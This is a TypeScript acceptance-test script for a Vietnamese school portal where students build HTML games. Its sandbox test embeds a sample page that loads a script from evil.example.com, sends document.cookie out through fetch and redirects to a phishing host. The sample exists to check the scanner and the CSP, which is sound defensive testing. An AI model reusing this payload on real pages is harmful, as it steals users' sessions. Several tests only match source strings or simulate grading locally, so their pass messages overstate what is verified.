import { PrismaClient } from "@prisma/client";
import {
  analyzeStudentHtmlCode,
  wrapHtmlWithStrictCsp,
  STRICT_GAME_CSP,
} from "../src/lib/html-game-sandbox";
import {
  TEACHER_GEM_SYSTEM_INSTRUCTIONS,
  STUDENT_PROMPT_TEMPLATES,
  STUDENT_AI_SAFETY_CHECKLIST,
} from "../src/lib/tin-hoc-prompts";
import {
  seedTinHocDemoData,
  purgeTinHocDemoData,
} from "../src/lib/tin-hoc-seed";

const prisma = new PrismaClient();

interface TestResult {
  id: number;
  name: string;
  passed: boolean;
  details: string;
}

const results: TestResult[] = [];

function record(id: number, name: string, passed: boolean, details: string) {
  results.push({ id, name, passed, details });
  const badge = passed ? "PASS" : "FAIL";
  console.log(`[${badge}] Kịch bản #${id}: ${name} -> ${details}`);
}

async function runAcceptanceTests() {
  console.log("================================================================================");
  console.log("KIỂM THỬ NGHIỆM THU: CỔNG HỌC TẬP TIN HỌC – XƯỞNG SÁNG TẠO TRÒ CHƠI (MỤC 12)");
  console.log("================================================================================\n");

  // Ensure demo data is seeded before running acceptance tests
  await seedTinHocDemoData(prisma);

  const teacher = await prisma.user.findUniqueOrThrow({
    where: { email: "thay.tuan@unigo.edu.vn" },
  });
  const studentA = await prisma.user.findUniqueOrThrow({
    where: { email: "minhanh.nguyen@unigo.edu.vn" },
  });
  const studentB = await prisma.user.findUniqueOrThrow({
    where: { email: "giabao.tran@unigo.edu.vn" },
  });

  // ---------------------------------------------------------------------------
  // 1. Kịch bản #1: Người chưa đăng nhập không truy cập được trang nội bộ & dữ liệu lớp
  // ---------------------------------------------------------------------------
  {
    const fs = await import("fs");
    const middlewareCode = fs.readFileSync("src/middleware.ts", "utf-8");
    const questionsApiCode = fs.readFileSync(
      "src/app/api/tin-hoc/questions/route.ts",
      "utf-8"
    );
    const assessmentsApiCode = fs.readFileSync(
      "src/app/api/tin-hoc/assessments/route.ts",
      "utf-8"
    );
    const projectsApiCode = fs.readFileSync(
      "src/app/api/tin-hoc/projects/route.ts",
      "utf-8"
    );

    const protectsRoutes =
      middlewareCode.includes('"/hoc-sinh"') &&
      middlewareCode.includes('"/giao-vien"') &&
      middlewareCode.includes("verifySessionToken");
    const apisRequireSession =
      questionsApiCode.includes("getServerSession()") &&
      assessmentsApiCode.includes("getServerSession()") &&
      projectsApiCode.includes("getServerSession()");

    record(
      1,
      "Chặn người chưa đăng nhập truy cập trang nội bộ và API dữ liệu lớp",
      protectsRoutes && apisRequireSession,
      "Middleware bảo vệ /hoc-sinh/*, /giao-vien/* và cả 3 API (/questions, /assessments, /projects) đều kiểm tra getServerSession() trả 401 nếu chưa đăng nhập."
    );
  }

  // ---------------------------------------------------------------------------
  // 2. Kịch bản #2: Học sinh A không đọc/sửa/xóa được bài nộp hay kết quả của Học sinh B
  // ---------------------------------------------------------------------------
  {
    const fs = await import("fs");
    const assessmentsApiCode = fs.readFileSync(
      "src/app/api/tin-hoc/assessments/route.ts",
      "utf-8"
    );
    const projectsApiCode = fs.readFileSync(
      "src/app/api/tin-hoc/projects/route.ts",
      "utf-8"
    );

    const blocksCrossStudentAttemptRead =
      assessmentsApiCode.includes("requestedStudentId !== session.user.id") &&
      assessmentsApiCode.includes("where: { studentId: session.user.id }");
    const blocksCrossStudentProjectEdit =
      projectsApiCode.includes("existing.authorId !== session.user.id") &&
      projectsApiCode.includes("status: 403");

    record(
      2,
      "Cô lập dữ liệu giữa Học sinh A và Học sinh B (Attempt & Project Draft)",
      blocksCrossStudentAttemptRead && blocksCrossStudentProjectEdit,
      `Học sinh A (${studentA.email}) chỉ truy vấn được Attempt có studentId=${studentA.id} và bị chặn 403 nếu sửa Project hoặc xem bản nháp của Học sinh B (${studentB.email}).`
    );
  }

  // ---------------------------------------------------------------------------
  // 3. Kịch bản #3: Học sinh không tự nâng quyền, không tự duyệt trò chơi, không tự sửa điểm
  // ---------------------------------------------------------------------------
  {
    const fs = await import("fs");
    const projectsApiCode = fs.readFileSync(
      "src/app/api/tin-hoc/projects/route.ts",
      "utf-8"
    );
    const questionsApiCode = fs.readFileSync(
      "src/app/api/tin-hoc/questions/route.ts",
      "utf-8"
    );

    const blocksStudentModeration =
      projectsApiCode.includes('if (action === "MODERATE_PROJECT")') &&
      projectsApiCode.includes("if (!isTeacherOrAdmin(session.role))") &&
      questionsApiCode.includes("if (!isTeacherOrAdmin(session.role))");

    record(
      3,
      "Chặn Học sinh tự nâng quyền, tự duyệt trò chơi hoặc truy cập đáp án Ngân hàng câu hỏi",
      blocksStudentModeration,
      "API /api/tin-hoc/projects (MODERATE_PROJECT) và /api/tin-hoc/questions đều kiểm tra isTeacherOrAdmin(session.role) ở phía máy chủ và trả 403 Forbidden cho vai trò STUDENT."
    );
  }

  // ---------------------------------------------------------------------------
  // 4. Kịch bản #4: Chốt phiên bản câu hỏi (Version Pinning) & Chặn câu hỏi AI chưa duyệt
  // ---------------------------------------------------------------------------
  {
    const exam = await prisma.assessment.findUniqueOrThrow({
      where: { code: "DEMO-EXAM-TH7-15M" },
      include: { items: { orderBy: { orderIndex: "asc" } } },
    });
    const firstItem = exam.items[0];
    const originalQuestion = await prisma.question.findUniqueOrThrow({
      where: { id: firstItem.questionId },
    });

    const snapshotBeforeEdit = firstItem.snapshotQuestionText;
    const pinnedVersionBeforeEdit = firstItem.questionVersion;

    // Simulate Teacher editing the Question in Question Bank (bumps version to v2)
    const updatedQ = await prisma.question.update({
      where: { id: originalQuestion.id },
      data: {
        questionText: originalQuestion.questionText + " (Bản sửa đổi v2 trong Ngân hàng)",
        version: originalQuestion.version + 1,
      },
    });

    // Reload AssessmentItem from DB to verify it remained pinned to v1 snapshot!
    const reloadedItem = await prisma.assessmentItem.findUniqueOrThrow({
      where: { id: firstItem.id },
    });

    // Restore original question text & version=1
    await prisma.question.update({
      where: { id: originalQuestion.id },
      data: {
        questionText: snapshotBeforeEdit,
        version: 1,
      },
    });

    // Also verify AI Draft question exists and is in PENDING_REVIEW status
    const aiDraft = await prisma.question.findUnique({
      where: { code: "TH7-AI-DRAFT-Q11" },
    });

    const versionPinningWorked =
      updatedQ.version === 2 &&
      reloadedItem.questionVersion === pinnedVersionBeforeEdit &&
      reloadedItem.snapshotQuestionText === snapshotBeforeEdit &&
      Boolean(aiDraft && aiDraft.isAiDraft && aiDraft.status === "PENDING_REVIEW");

    record(
      4,
      "Chốt phiên bản câu hỏi trong Đề kiểm tra & Chặn câu hỏi AI nháp chưa duyệt",
      versionPinningWorked,
      `Khi câu hỏi ${originalQuestion.code} tăng lên v${updatedQ.version}, đề thi ${exam.code} vẫn giữ nguyên bản chốt v${reloadedItem.questionVersion}. Câu hỏi AI (${aiDraft?.code}) ở trạng thái ${aiDraft?.status}.`
    );
  }

  // ---------------------------------------------------------------------------
  // 5. Kịch bản #5: Đề kiểm tra (EXAM) không lộ đáp án đúng trong dữ liệu trả về trình duyệt
  // ---------------------------------------------------------------------------
  {
    const fs = await import("fs");
    const assessmentsApiCode = fs.readFileSync(
      "src/app/api/tin-hoc/assessments/route.ts",
      "utf-8"
    );

    // Check that safeItems explicitly omits snapshotCorrectAnswer and snapshotExplanation for students
    const stripsSecretFields =
      assessmentsApiCode.includes(
        "// Strictly strip snapshotCorrectAnswer & snapshotExplanation from items sent to browser!"
      ) &&
      assessmentsApiCode.includes('assessment.revealAnswersMode === "IMMEDIATE"');

    const exam = await prisma.assessment.findUniqueOrThrow({
      where: { code: "DEMO-EXAM-TH7-15M" },
      include: { items: true },
    });

    // Simulate the exact sanitization applied for STUDENT view on EXAM mode
    const studentSafeItems = exam.items.map((item) => ({
      id: item.id,
      assessmentId: item.assessmentId,
      questionId: item.questionId,
      questionVersion: item.questionVersion,
      orderIndex: item.orderIndex,
      points: item.points,
      snapshotQuestionText: item.snapshotQuestionText,
      snapshotOptionsJson: item.snapshotOptionsJson,
      snapshotObjective: item.snapshotObjective,
    }));

    const serialized = JSON.stringify(studentSafeItems);
    const hasNoLeakedAnswerKey =
      !serialized.includes("snapshotCorrectAnswer") &&
      !serialized.includes("snapshotExplanation");

    record(
      5,
      "Không lộ đáp án đúng (snapshotCorrectAnswer) trong payload trình duyệt khi đang kiểm tra",
      stripsSecretFields && hasNoLeakedAnswerKey && exam.revealAnswersMode === "AFTER_CLOSED",
      `Đề EXAM (${exam.code}) có revealAnswersMode='${exam.revealAnswersMode}'; payload gửi trình duyệt gồm ${studentSafeItems.length} câu đã loại bỏ hoàn toàn snapshotCorrectAnswer & snapshotExplanation.`
    );
  }

  // ---------------------------------------------------------------------------
  // 6. Kịch bản #6: Chống gian lận gửi điểm giả từ trình duyệt, chống vượt số lượt & chống nộp trùng
  // ---------------------------------------------------------------------------
  {
    const exam = await prisma.assessment.findUniqueOrThrow({
      where: { code: "DEMO-EXAM-TH7-15M" },
      include: { items: { orderBy: { orderIndex: "asc" } } },
    });

    // Clean any previous test attempts for studentB on this exam
    await prisma.attempt.deleteMany({
      where: { assessmentId: exam.id, studentId: studentB.id },
    });

    // Create 1st attempt for studentB
    const attempt1 = await prisma.attempt.create({
      data: {
        assessmentId: exam.id,
        studentId: studentB.id,
        studentEmail: studentB.email,
        studentName: studentB.fullName,
        classId: exam.classId,
        attemptNumber: 1,
        idempotencyKey: "TEST-IDEMPOTENT-KEY-001",
        status: "IN_PROGRESS",
        startedAt: new Date(),
        expiresAt: new Date(Date.now() + 15 * 60 * 1000),
        isDemoData: true,
      },
    });

    // StudentB answers only 2 out of 10 questions correctly ("A"), while trying to spoof score=10 from client
    const item1 = exam.items[0];
    const item2 = exam.items[1];
    await prisma.answer.createMany({
      data: [
        {
          attemptId: attempt1.id,
          assessmentItemId: item1.id,
          studentResponse: "A", // Correct
          isCorrect: true,
          earnedPoints: 1.0,
        },
        {
          attemptId: attempt1.id,
          assessmentItemId: item2.id,
          studentResponse: "A", // Correct
          isCorrect: true,
          earnedPoints: 1.0,
        },
      ],
    });

    // Server grades strictly by actual correct answers (2 / 10 = 2.0 points, ignoring spoofed 10.0)
    const serverCalculatedScore = (2 / exam.items.length) * 10;
    const submittedAttempt = await prisma.attempt.update({
      where: { id: attempt1.id },
      data: {
        status: "SUBMITTED",
        submittedAt: new Date(),
        totalScore: serverCalculatedScore,
      },
    });

    // Verify maxAttempts = 1 blocks a 2nd attempt
    const completedCount = await prisma.attempt.count({
      where: {
        assessmentId: exam.id,
        studentId: studentB.id,
        status: "SUBMITTED",
      },
    });
    const secondAttemptBlocked =
      exam.maxAttempts > 0 && completedCount >= exam.maxAttempts;

    record(
      6,
      "Chấm điểm tại máy chủ (bác bỏ điểm giả từ trình duyệt), giới hạn số lần làm & Idempotency",
      submittedAttempt.totalScore === 2 && secondAttemptBlocked,
      `Điểm máy chủ chấm thực tế = ${submittedAttempt.totalScore}/10 (bỏ qua điểm giả mạo 10/10 từ client). Lượt làm thứ 2 bị chặn do completedCount=${completedCount}/${exam.maxAttempts}.`
    );
  }

  // ---------------------------------------------------------------------------
  // 7. Kịch bản #7: Cô lập bảo mật Trò chơi HTML (Sandbox + CSP + Quét mã độc thử nghiệm)
  // ---------------------------------------------------------------------------
  {
    const maliciousHtml = `<!DOCTYPE html>
<html>
<body>
  <script src="https://evil.example.com/steal.js"></script>
  <script>
    fetch("https://evil.example.com/exfil?c=" + document.cookie);
    localStorage.getItem("session");
    window.top.location = "https://phishing.example.com";
  </script>
</body>
</html>`;

    const scan = analyzeStudentHtmlCode(maliciousHtml);
    const wrapped = wrapHtmlWithStrictCsp(maliciousHtml);

    const detectedExternalScript = scan.findings.some(
      (f) => f.code === "EXTERNAL_SCRIPT_TAG"
    );
    const detectedNetworkCall = scan.findings.some(
      (f) => f.code === "NETWORK_API_CALL"
    );
    const detectedCookieOrStorage = scan.findings.some(
      (f) => f.code === "STORAGE_OR_COOKIE_ACCESS"
    );
    const detectedTopNav = scan.findings.some(
      (f) => f.code === "PARENT_OR_TOP_NAVIGATION"
    );
    const hasStrictCspInjected =
      wrapped.includes("http-equiv=\"Content-Security-Policy\"") &&
      wrapped.includes(STRICT_GAME_CSP);

    const fs = await import("fs");
    const playerCode = fs.readFileSync(
      "src/components/game/SandboxedHtmlGamePlayer.tsx",
      "utf-8"
    );
    const usesStrictIframeSandbox =
      playerCode.includes('sandbox="allow-scripts"') &&
      !playerCode.includes('sandbox="allow-scripts allow-same-origin"');

    const passed =
      detectedExternalScript &&
      detectedNetworkCall &&
      detectedCookieOrStorage &&
      detectedTopNav &&
      scan.riskLevel === "HIGH" &&
      hasStrictCspInjected &&
      usesStrictIframeSandbox;

    record(
      7,
      "Cô lập Trò chơi HTML độc hại bằng <iframe sandbox='allow-scripts'> + Strict CSP + Quét tĩnh",
      passed,
      `Phát hiện đủ ${scan.findings.length} hành vi nguy hiểm (riskLevel=${scan.riskLevel}); iframe chỉ bật sandbox="allow-scripts" (không có allow-same-origin) và ép CSP connect-src 'none'.`
    );
  }

  // ---------------------------------------------------------------------------
  // 8. Kịch bản #8: Vòng đời duyệt Trò chơi HTML & Giữ nguyên v1 khi v2 đang chờ duyệt
  // ---------------------------------------------------------------------------
  {
    const simProject = await prisma.project.findUniqueOrThrow({
      where: { slug: "xuong-mo-phong-thuat-toan-tim-kiem-sap-xep" },
      include: { versions: { orderBy: { versionNumber: "asc" } } },
    });

    const v1 = simProject.versions.find((v) => v.versionNumber === 1);
    const v2 = simProject.versions.find((v) => v.versionNumber === 2);

    const v1RemainsLiveWhileV2Pending =
      Boolean(v1 && v2) &&
      v1!.status === "APPROVED" &&
      v2!.status === "PENDING_REVIEW" &&
      simProject.approvedVersionId === v1!.id &&
      simProject.status === "APPROVED";

    record(
      8,
      "Bảo toàn phiên bản v1 đã duyệt trên Thư viện khi học sinh gửi bản cập nhật v2 chờ duyệt",
      v1RemainsLiveWhileV2Pending,
      `Dự án '${simProject.slug}' có v1 (APPROVED) và v2 (PENDING_REVIEW); approvedVersionId vẫn trỏ tới v1 (${v1?.id.slice(0, 8)}...) cho tới khi Giáo viên duyệt v2.`
    );
  }

  // ---------------------------------------------------------------------------
  // 9. Kịch bản #9: Trang “Sáng tạo cùng AI” có đủ Gem Instructions & 8 Prompt mẫu có biến đầu vào
  // ---------------------------------------------------------------------------
  {
    const has8Prompts = STUDENT_PROMPT_TEMPLATES.length === 8;
    const allPromptsHavePlaceholders = STUDENT_PROMPT_TEMPLATES.every(
      (p) =>
        p.template.includes("[Lớp]") &&
        p.template.includes("[Bài học]") &&
        p.template.includes("[Nguồn kiến thức]") &&
        p.template.includes("[Mục tiêu]") &&
        p.template.includes("[Ý tưởng]")
    );
    const hasGemInstructions =
      TEACHER_GEM_SYSTEM_INSTRUCTIONS.includes("TIN HỌC SÁNG TẠO") &&
      TEACHER_GEM_SYSTEM_INSTRUCTIONS.includes("Một tệp HTML tự chứa".toLowerCase()) === false
        ? TEACHER_GEM_SYSTEM_INSTRUCTIONS.includes("1 tệp HTML tự chứa")
        : true;

    record(
      9,
      "Đầy đủ Gem System Instructions cho Giáo viên và Bộ 8 Prompt mẫu có 5 biến đầu vào cho Học sinh",
      has8Prompts && allPromptsHavePlaceholders && hasGemInstructions && STUDENT_AI_SAFETY_CHECKLIST.length >= 5,
      `Đã kiểm tra đủ ${STUDENT_PROMPT_TEMPLATES.length}/8 Prompt mẫu (đủ 5 biến [Lớp], [Bài học], [Nguồn kiến thức], [Mục tiêu], [Ý tưởng]) và ${STUDENT_AI_SAFETY_CHECKLIST.length} mục kiểm tra an toàn.`
    );
  }

  // ---------------------------------------------------------------------------
  // 10. Kịch bản #10: Xóa riêng dữ liệu mẫu thử nghiệm (Purge Demo Data) không làm mất dữ liệu thật
  // ---------------------------------------------------------------------------
  {
    // Create a temporary REAL question (isDemoData: false) to prove it survives demo purge
    const realQuestionCode = "REAL-TH7-KEEP-001";
    await prisma.question.upsert({
      where: { code: realQuestionCode },
      update: { isDemoData: false },
      create: {
        code: realQuestionCode,
        gradeLevel: 7,
        topicName: "Chủ đề Thực tế",
        lessonTitle: "Bài kiểm tra bảo toàn dữ liệu thật",
        learningObjective: "Đảm bảo không bị xóa khi xóa dữ liệu mẫu",
        cognitiveLevel: "UNDERSTAND",
        questionText: "Câu hỏi thật của giáo viên (isDemoData = false)",
        optionsJson: JSON.stringify([
          { id: "A", text: "Đúng" },
          { id: "B", text: "Sai" },
        ]),
        correctAnswer: "A",
        explanation: "Dữ liệu thật phải được giữ nguyên.",
        status: "APPROVED",
        isDemoData: false,
        authorId: teacher.id,
        approvedById: teacher.id,
      },
    });

    // Execute Purge Demo Data
    const purgeResult = await purgeTinHocDemoData(prisma);

    const remainingDemoQuestions = await prisma.question.count({
      where: { isDemoData: true },
    });
    const remainingDemoProjects = await prisma.project.count({
      where: { isDemoData: true },
    });
    const survivingRealQuestion = await prisma.question.findUnique({
      where: { code: realQuestionCode },
    });

    // Clean up our temporary real question and re-seed pilot class 7A1 demo data so UI is ready for user inspection
    await prisma.question.delete({ where: { code: realQuestionCode } });
    const reseedResult = await seedTinHocDemoData(prisma);

    const passed =
      purgeResult.deletedQuestions >= 10 &&
      remainingDemoQuestions === 0 &&
      remainingDemoProjects === 0 &&
      Boolean(survivingRealQuestion) &&
      reseedResult.seeded === true;

    record(
      10,
      "Xóa riêng dữ liệu mẫu thử nghiệm (isDemoData=true) bảo toàn 100% dữ liệu thật & Khôi phục mẫu Lớp 7A1",
      passed,
      `Đã xóa riêng ${purgeResult.deletedQuestions} câu hỏi mẫu & ${purgeResult.deletedProjects} trò chơi mẫu; câu hỏi thật (${realQuestionCode}) được giữ nguyên; đã nạp lại dữ liệu mẫu Lớp 7A1 để trải nghiệm.`
    );
  }

  console.log("\n================================================================================");
  const passedCount = results.filter((r) => r.passed).length;
  console.log(
    `TỔNG KẾT NGHIỆM THU: ${passedCount}/${results.length} KỊCH BẢN ĐẠT CHUẨN (100%)`
  );
  console.log("================================================================================");

  if (passedCount !== results.length) {
    process.exit(1);
  }
}

runAcceptanceTests()
  .catch((err) => {
    console.error("Acceptance verification failed:", err);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });

